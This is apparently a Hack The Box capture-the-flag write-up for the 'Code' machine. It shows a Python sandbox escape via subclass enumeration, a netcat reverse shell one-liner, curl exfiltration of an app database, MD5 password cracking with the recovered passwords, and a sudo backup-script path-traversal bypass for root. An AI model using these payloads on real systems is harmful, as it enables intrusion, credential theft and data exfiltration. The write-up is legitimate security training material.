## ENUM

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn 20.0.4
```

site hosted at: [http://10.10.11.62:5000/](http://10.10.11.62:5000/)

```
===============================================================
[+] Url:                     http://10.10.11.62:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 818]
/codes                (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 730]
/logout               (Status: 302) [Size: 189] [--> /]
/register             (Status: 200) [Size: 741]
Progress: 4614 / 4615 (99.98%)
===============================================================
```

I will now use the site normally with Burp to analyze the traffic.

## INITIAL ACCESS

By using the service, I register a code and access it via the interface located at [http://10.10.11.62:5000/codes](http://10.10.11.62:5000/codes)

![alt text](note/ctf/asset/HTB_code0.png)

I notice the ID which may possibly be a lead to follow.

I will analyze the traffic in detail now that I have tested the service.

I find this cookie after my registration:
`.eJzNj7EKAjEQRH9l3TpcY3d_IFiInchxLMleXIgbyCaKHPfvphVLG6sp3ryBWXFeEtmNDcfrilB74J3NKDI6PHMUq4WqZAVr3neytLSDS27gSUHzE1KOIDrgtLnvhYM-KEkAXziwVqFkA5wSkzHU8gKK9Hfu76-POcqH2muTw2ZcZgk47rc3MC-Avg.aGhhzw.XzQb8mECgGghn8HdWybDRBwF9h8`

I try exploiting the code ID but nothing interesting…

I focus on the code window itself.

I can’t do imports etc. However, it does display complete errors (via `raise`, `Exception`, etc.). Maybe I can leak something?

I will try to leak the classes loaded in memory. Why?

To find a library already loaded (so without import) and use it without being blacklisted!

To find useful classes to execute code such as subprocess.Popen which allows executing commands:

```python
classes = (()).__class__.__bases__[0].__subclasses__()
for i, cls in enumerate(classes):
    print(i, cls)
```

and I find it here: `317 <class 'subprocess.Popen'>`

I try to execute it like this:
`(()).__class__.__bases__[0].__subclasses__()[317]("ls", shell=True).communicate()`

but it doesn’t work, so I use raise!

```python
raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](  
    "whoami", shell=True, stdout=-1).communicate()))
```

![alt text](note/ctf/asset/HTB_code1.png)

Perfect, I generate a reverse shell payload!

```python
raise Exception(str((()) .__class__.__bases__[0].__subclasses__()[317](  
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.123 4848 >/tmp/f", shell=True, stdout=-1).communicate()))
```

And I can display user.txt.

## OWN USER:

Now that I am on the machine, I will search some files including app.py which corresponds to the application, I find interesting elements:

```python
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
```

I see a secret key and a database.

```shell
root:x:0:0:root:/root:/bin/bash
...
app-production:x:1001:1001:,,,:/home/app-production:/bin/bash
martin:x:1000:1000:,,,:/home/martin:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

So a user named martin and root (since im app-production).

And if the database contained martin’s password?

I exfiltrate it: `curl -F 'data=@/home/app-production/app/instance/database.db' http://ip:port`

and I find:

| user        | password                         |
| ----------- | -------------------------------- |
| development | 759b74ce43947f5f4c91aeddc3e5bad3 |
| martin      | 3de6f30c4a09c27fc71932bfc68474be |

I try SSH login with it but it doesn’t work and that’s normal… it looks a lot like an MD5 hash! I crack it: `nafeelswordsmaster`

`ssh martin@10.10.11.62`

and it works!

I crack the dev one just in case: `development`

Here are the interesting results from linpeas:

#### Linpeas results:

processes running as root:

```
root         851  0.0  0.2 241372 11340 ?        Ssl  Jul04   0:00 /usr/sbin/ModemManager
...
root        3075  0.0  0.2 249528  9512 ?        Ssl  Jul04   0:00 /usr/lib/upower/upowerd
```

#### BIG LEAD

```
Matching Defaults entries for martin on localhost:                                                                                                                                                                                          
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

I analyze the script:

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

It parses a JSON used to make a backup with backy, so if I provide a good JSON that extracts root (via a custom path traversal that bypasses the filter: `updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file"))`

then I will be able to own root. I look for documentation:

[https://github.com/vdbsh/backy](https://github.com/vdbsh/backy) perfect, I cook the JSON:

```json
{
  "destination": "/home/martin",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root/"
  ]
}
```

I execute it: `sudo /usr/bin/backy.sh payload.json`

and I retrieve the tar.gz file:
`scp martin@10.10.11.62:/home/martin/code_home_.._root_2025_July.tar.bz2 .`

and I own root! ✅
